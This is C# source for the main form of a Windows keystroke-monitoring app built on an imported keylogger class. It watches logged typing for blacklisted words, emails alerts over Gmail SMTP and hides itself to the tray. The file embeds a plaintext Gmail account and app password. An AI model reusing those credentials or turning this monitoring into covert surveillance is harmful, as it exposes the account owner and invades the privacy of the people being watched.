using KeystrokeMonitor.DataAccess;
using KeystrokeMonitor.DataAccess.Entities;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WindowsAppKeylogger;

namespace KeystrokeMonitor
{
    public partial class frmHomePage : MetroFramework.Forms.MetroForm
    {
        KeystrokeMonitorDBContext _dbContext = new KeystrokeMonitorDBContext();
        public InterceptKeys _interceptKeys;
        public Thread _thread;
        public bool _closeSMTPSender = false;
        public string _WordCode = string.Empty;
        public System.Threading.Timer timer;

        public frmHomePage(InterceptKeys interceptKeys)
        {
            var words = _dbContext.BlackListWords.Where(a => a.IsSended)
                                                 .ToList()
                                                 .Select(c => { c.IsSended = false; return c; })
                                                 .ToList();
            foreach (var item in words)
                _dbContext.Entry(item).State = EntityState.Modified;
            _dbContext.SaveChanges();

            InitializeComponent();
            _interceptKeys = interceptKeys;
            _thread = new Thread(new ThreadStart(RunMonitoring));
            GetBlackListWords();

            File.Delete(Application.StartupPath + @"\log.txt");
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            var path = Application.StartupPath + @"\log.txt";
            if (!File.Exists(path))
                File.CreateText(path).Dispose();

            if (!_thread.IsAlive)
                _thread.Start();
            else
                _thread.Resume();

            RunMailSender();
            btnStart.Text = "STOP";
            btnStart.Style = MetroFramework.MetroColorStyle.Red;
            btnStart.Click -= btnStart_Click;
            btnStart.Click += btnStop_Click;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            _thread.Suspend();
            btnStart.Text = "START";
            timer.Dispose();
            btnStart.Style = MetroFramework.MetroColorStyle.Green;
            btnStart.Click -= btnStop_Click;
            btnStart.Click += btnStart_Click;
        }

        public void RunMonitoring()
        {
            _interceptKeys.Run();
        }

        public void RunMailSender()
        {
            try
            {
                var startTimeSpan = TimeSpan.Zero;
                var periodTimeSpan = TimeSpan.FromMinutes(0.1);

                timer = new System.Threading.Timer((e) =>
                {
                    string words = System.IO.File.ReadAllText(Application.StartupPath + @"\log.txt");

                    var BLW = _dbContext.BlackListWords.Where(a => !a.IsSended).ToList();
                    foreach (var item in BLW)
                    {
                        if (words.Contains(item.WordCode))
                        {
                            var word = _dbContext.BlackListWords.Where(a => a.ID == item.ID).FirstOrDefault();
                            word.IsSended = true;
                            _dbContext.Entry(word).State = EntityState.Modified;
                            _dbContext.SaveChanges();

                            MailMessage mail = new MailMessage();
                            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                            mail.From = new MailAddress("abualqaseem974@gmail.com", "Keystroke Monitor");
                            mail.To.Add(txtEmail.Text);
                            mail.Subject = "Device Monitor Alert";
                            mail.Body = "This word (" + word.Word + ") has been used on your device a while ago";

                            SmtpServer.Port = 587;
                            SmtpServer.Credentials = new System.Net.NetworkCredential("abualqaseem974@gmail.com", "vjzpoknhrprqlrql");
                            SmtpServer.EnableSsl = true;
                            SmtpServer.Send(mail);
                        }
                    }

                }, null, startTimeSpan, periodTimeSpan);
            }
            catch { }
        }

        private void notifyTASK_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Show();
            this.WindowState = FormWindowState.Normal;
            notifyTASK.Visible = false;
        }

        private void frmHomePage_Resize(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                Hide();
                notifyTASK.Visible = true;
            }
        }

        private void frmHomePage_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch (Exception)
            {
                Application.Exit();
            }
        }

        private async void btnSave_Click(object sender, EventArgs e)
        {
            BlackListWord objBlackWord = new BlackListWord();
            objBlackWord.Word = txtWord.Text;
            objBlackWord.WordCode = _WordCode;
            objBlackWord.IsSended = false;
            objBlackWord.CreationDate = DateTime.Now;

            _dbContext.BlackListWords.Add(objBlackWord);
            await _dbContext.SaveChangesAsync();

            txtWord.Text = string.Empty;
            _WordCode = string.Empty;
            await GetBlackListWords();

            MessageBox.Show("Done");
        }

        private async void mtControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (mtControl.SelectedTab == mtControl.TabPages["BlacklistWords"])
            {
                try
                {
                    await GetBlackListWords();
                }
                catch
                {
                    MessageBox.Show("There is a problem, Please contact the developer ", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async Task GetBlackListWords()
        {
            dgvBlacklistWord.Rows.Clear();
            var results = await _dbContext.BlackListWords.ToListAsync();
            int count = 0;
            foreach (var item in results.OrderByDescending(x => x.CreationDate).ToList())
            {
                if (dgvBlacklistWord.IsDisposed)
                    return;

                dgvBlacklistWord.Rows.Add(item.ID, count++, item.Word);
                Application.DoEvents();
            }
        }

        private async void dgvBlacklistWord_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                try
                {
                    DialogResult dialogResult = MessageBox.Show("Are you sure you want to continue ?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    if (dialogResult == DialogResult.No)
                        return;

                    string FileId;
                    if (this.dgvBlacklistWord.CurrentRow == null)
                        return;
                    else
                        FileId = this.dgvBlacklistWord.CurrentRow.Cells["ID"].Value.ToString();

                    var FileInfo = await _dbContext.BlackListWords.Where(a => a.ID.ToString() == FileId).FirstOrDefaultAsync();

                    if (FileInfo == null)
                        return;

                    dgvBlacklistWord.Rows.RemoveAt(this.dgvBlacklistWord.CurrentRow.Index);
                    _dbContext.BlackListWords.Remove(FileInfo);
                    await _dbContext.SaveChangesAsync();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("There is a problem, Please contact the developer ", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void txtWord_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyValue == 8)
                {
                    txtWord.Text = _WordCode = _WordCode.Remove(_WordCode.Length - 1);
                    return;
                }

                if (e.KeyValue >= 0)
                {
                    if (e.KeyValue >= 65 && e.KeyValue <= 90)
                        _WordCode += e.KeyData.ToString();
                    else if (e.KeyValue == (int)Keys.Enter)
                        return;
                    else if (e.KeyValue == (int)Keys.Space)
                        _WordCode += " ";
                    else
                        _WordCode += KeyCodeToUnicode((Keys)e.KeyValue);
                }
            }
            catch { }
        }

        public static string KeyCodeToUnicode(Keys key)
        {
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus = GetKeyboardState(keyboardState);

            if (!keyboardStateStatus)
            {
                return "";
            }

            uint virtualKeyCode = (uint)key;
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

            StringBuilder result = new StringBuilder();
            ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);

            return result.ToString();
        }

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
    }
}
